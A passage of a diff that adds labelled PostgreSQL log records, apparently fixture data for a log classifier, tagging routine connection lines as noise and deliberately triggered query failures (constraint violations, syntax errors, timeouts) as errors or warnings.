+    "raw_log": "2026-09-15 07:32:16.017 UTC [1] LOG:  listening on Unix socket \"/var/run/postgresql/.s.PGSQL.5432\"",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:16.032 UTC [55] LOG:  database system was shut down at 2026-09-15 07:32:15 UTC",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:17.662 UTC [65] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:17.663 UTC [65] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:17.679 UTC [65] LOG:  statement: SELECT 1;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:17.680 UTC [65] LOG:  disconnection: session time: 0:00:00.017 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:17.930 UTC [72] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:17.931 UTC [72] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:17.933 UTC [72] LOG:  statement: CREATE TABLE accounts (id serial primary key, name text not null, balance int check (balance >= 0), code varchar(4));",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:17.965 UTC [72] LOG:  disconnection: session time: 0:00:00.035 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.195 UTC [79] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.196 UTC [79] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.199 UTC [79] LOG:  statement: CREATE TABLE orders (order_id serial primary key, account_id int references accounts(id));",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.228 UTC [79] LOG:  disconnection: session time: 0:00:00.033 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.478 UTC [86] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.479 UTC [86] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.481 UTC [86] LOG:  statement: INSERT INTO accounts (name, balance, code) VALUES ('alice', 100, 'A01'), ('bob', 200, 'B02');",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.523 UTC [86] LOG:  disconnection: session time: 0:00:00.044 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.758 UTC [93] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.759 UTC [93] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.760 UTC [93] LOG:  statement: SELECT balance FROM accounts WHERE name = 'alice';",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:18.763 UTC [93] LOG:  disconnection: session time: 0:00:00.005 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.035 UTC [100] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.036 UTC [100] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.039 UTC [100] LOG:  statement: UPDATE accounts SET balance = balance + 10 WHERE name = 'bob';",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.046 UTC [100] LOG:  disconnection: session time: 0:00:00.010 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.286 UTC [107] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.286 UTC [107] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.289 UTC [107] LOG:  statement: SELECT * FROM missing_table_catalog;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.289 UTC [107] ERROR:  relation \"missing_table_catalog\" does not exist at character 15",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.289 UTC [107] STATEMENT:  SELECT * FROM missing_table_catalog;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.289 UTC [107] LOG:  disconnection: session time: 0:00:00.004 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.530 UTC [115] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.531 UTC [115] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.532 UTC [115] ERROR:  syntax error at or near \"INVALID\" at character 1",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.532 UTC [115] STATEMENT:  INVALID QUERY GRAMMAR FAIL;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.533 UTC [115] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.811 UTC [122] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.812 UTC [122] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.814 UTC [122] LOG:  statement: INSERT INTO accounts (id, name, balance) VALUES (1, 'conflict', 50);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.816 UTC [122] ERROR:  duplicate key value violates unique constraint \"accounts_pkey\"",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.816 UTC [122] DETAIL:  Key (id)=(1) already exists.",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.816 UTC [122] STATEMENT:  INSERT INTO accounts (id, name, balance) VALUES (1, 'conflict', 50);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:19.817 UTC [122] LOG:  disconnection: session time: 0:00:00.005 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.178 UTC [129] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.179 UTC [129] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.181 UTC [129] LOG:  statement: SELECT balance / 0 FROM accounts;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.183 UTC [129] ERROR:  division by zero",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.183 UTC [129] STATEMENT:  SELECT balance / 0 FROM accounts;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.184 UTC [129] LOG:  disconnection: session time: 0:00:00.006 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.430 UTC [136] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.431 UTC [136] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.433 UTC [136] LOG:  statement: UPDATE accounts SET balance = 'invalid_number' WHERE id = 1;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.434 UTC [136] ERROR:  invalid input syntax for type integer: \"invalid_number\" at character 31",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.434 UTC [136] STATEMENT:  UPDATE accounts SET balance = 'invalid_number' WHERE id = 1;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.435 UTC [136] LOG:  disconnection: session time: 0:00:00.004 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.680 UTC [143] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.681 UTC [143] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.683 UTC [143] LOG:  statement: SELECT invalid_column_name FROM accounts;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.684 UTC [143] ERROR:  column \"invalid_column_name\" does not exist at character 8",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.684 UTC [143] STATEMENT:  SELECT invalid_column_name FROM accounts;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.685 UTC [143] LOG:  disconnection: session time: 0:00:00.005 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.968 UTC [150] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.970 UTC [150] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.972 UTC [150] LOG:  statement: INSERT INTO orders (account_id) VALUES (99999);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.975 UTC [150] ERROR:  insert or update on table \"orders\" violates foreign key constraint \"orders_account_id_fkey\"",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.975 UTC [150] DETAIL:  Key (account_id)=(99999) is not present in table \"accounts\".",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.975 UTC [150] STATEMENT:  INSERT INTO orders (account_id) VALUES (99999);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:20.975 UTC [150] LOG:  disconnection: session time: 0:00:00.007 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.202 UTC [157] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.203 UTC [157] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.204 UTC [157] LOG:  statement: INSERT INTO accounts (name, balance) VALUES ('charlie', -50);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.206 UTC [157] ERROR:  new row for relation \"accounts\" violates check constraint \"accounts_balance_check\"",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.206 UTC [157] DETAIL:  Failing row contains (3, charlie, -50, null).",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.206 UTC [157] STATEMENT:  INSERT INTO accounts (name, balance) VALUES ('charlie', -50);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.207 UTC [157] LOG:  disconnection: session time: 0:00:00.005 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.413 UTC [164] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.414 UTC [164] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.416 UTC [164] LOG:  statement: INSERT INTO accounts (name, balance) VALUES (NULL, 30);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.418 UTC [164] ERROR:  null value in column \"name\" of relation \"accounts\" violates not-null constraint",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.418 UTC [164] DETAIL:  Failing row contains (4, null, 30, null).",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.418 UTC [164] STATEMENT:  INSERT INTO accounts (name, balance) VALUES (NULL, 30);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.418 UTC [164] LOG:  disconnection: session time: 0:00:00.004 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.620 UTC [171] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.621 UTC [171] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.623 UTC [171] LOG:  statement: SELECT non_existent_function_call(1, 2);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.623 UTC [171] ERROR:  function non_existent_function_call(integer, integer) does not exist at character 8",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.623 UTC [171] HINT:  No function matches the given name and argument types. You might need to add explicit type casts.",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.623 UTC [171] STATEMENT:  SELECT non_existent_function_call(1, 2);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.623 UTC [171] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.859 UTC [178] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.860 UTC [178] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.861 UTC [178] LOG:  statement: INSERT INTO accounts (name, balance, code) VALUES ('dave', 10, 'TOOLONGSTRING');",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.862 UTC [178] ERROR:  value too long for type character varying(4)",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.862 UTC [178] STATEMENT:  INSERT INTO accounts (name, balance, code) VALUES ('dave', 10, 'TOOLONGSTRING');",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:21.863 UTC [178] LOG:  disconnection: session time: 0:00:00.004 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.079 UTC [185] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.079 UTC [185] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.081 UTC [185] LOG:  statement: SELECT date '2026-02-31';",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.081 UTC [185] ERROR:  date/time field value out of range: \"2026-02-31\" at character 13",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.081 UTC [185] STATEMENT:  SELECT date '2026-02-31';",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.082 UTC [185] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.300 UTC [192] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.301 UTC [192] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.303 UTC [192] LOG:  statement: SELECT accounts.id FROM accounts JOIN orders ON accounts.id = orders.order_id GROUP BY balance;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.306 UTC [192] ERROR:  column \"accounts.id\" must appear in the GROUP BY clause or be used in an aggregate function at character 8",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.306 UTC [192] STATEMENT:  SELECT accounts.id FROM accounts JOIN orders ON accounts.id = orders.order_id GROUP BY balance;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.306 UTC [192] LOG:  disconnection: session time: 0:00:00.006 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.576 UTC [199] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.577 UTC [199] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.579 UTC [199] LOG:  statement: BEGIN READ ONLY; INSERT INTO accounts (name, balance) VALUES ('test', 10); COMMIT;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.580 UTC [199] ERROR:  cannot execute INSERT in a read-only transaction",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.580 UTC [199] STATEMENT:  BEGIN READ ONLY; INSERT INTO accounts (name, balance) VALUES ('test', 10); COMMIT;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.581 UTC [199] LOG:  disconnection: session time: 0:00:00.004 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.831 UTC [206] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.833 UTC [206] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.836 UTC [206] LOG:  statement: BEGIN; SELECT 1/0; SELECT 1; COMMIT;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.837 UTC [206] ERROR:  division by zero",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.837 UTC [206] STATEMENT:  BEGIN; SELECT 1/0; SELECT 1; COMMIT;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:22.838 UTC [206] LOG:  disconnection: session time: 0:00:00.006 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.094 UTC [213] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.095 UTC [213] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.097 UTC [213] LOG:  statement: SET statement_timeout = '10ms'; SELECT pg_sleep(0.5);",
+    "category": "warning"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.107 UTC [213] ERROR:  canceling statement due to statement timeout",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.107 UTC [213] STATEMENT:  SET statement_timeout = '10ms'; SELECT pg_sleep(0.5);",
+    "category": "warning"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.108 UTC [213] LOG:  disconnection: session time: 0:00:00.013 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.387 UTC [220] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.388 UTC [220] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.391 UTC [220] LOG:  statement: CREATE TABLE accounts (id int);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.392 UTC [220] ERROR:  relation \"accounts\" already exists",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.392 UTC [220] STATEMENT:  CREATE TABLE accounts (id int);",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.392 UTC [220] LOG:  disconnection: session time: 0:00:00.005 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.676 UTC [227] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.678 UTC [227] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.680 UTC [227] LOG:  statement: SELECT 'invalid_uuid'::uuid;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.680 UTC [227] ERROR:  invalid input syntax for type uuid: \"invalid_uuid\" at character 8",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.680 UTC [227] STATEMENT:  SELECT 'invalid_uuid'::uuid;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.681 UTC [227] LOG:  disconnection: session time: 0:00:00.004 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.962 UTC [234] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.963 UTC [234] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.965 UTC [234] LOG:  statement: COMMIT;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.965 UTC [234] WARNING:  there is no transaction in progress",
+    "category": "warning"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:23.965 UTC [234] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.204 UTC [241] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.205 UTC [241] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.207 UTC [241] LOG:  statement: ROLLBACK;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.207 UTC [241] WARNING:  there is no transaction in progress",
+    "category": "warning"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.207 UTC [241] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.444 UTC [248] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.445 UTC [248] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.447 UTC [248] LOG:  statement: DROP TABLE IF EXISTS non_existent_table_xyz;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.447 UTC [248] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.682 UTC [255] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.683 UTC [255] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.686 UTC [255] LOG:  statement: DROP INDEX IF EXISTS non_existent_index_abc;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.686 UTC [255] LOG:  disconnection: session time: 0:00:00.004 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.954 UTC [263] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.956 UTC [263] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.958 UTC [263] LOG:  statement: DROP SEQUENCE IF EXISTS non_existent_sequence_123;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:24.959 UTC [263] LOG:  disconnection: session time: 0:00:00.004 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.197 UTC [270] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.198 UTC [270] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.200 UTC [270] LOG:  statement: SET standard_conforming_strings = off; SELECT 'warning_escape\\\\pattern';",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.201 UTC [270] LOG:  disconnection: session time: 0:00:00.003 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.437 UTC [277] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:25.439 UTC [277] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
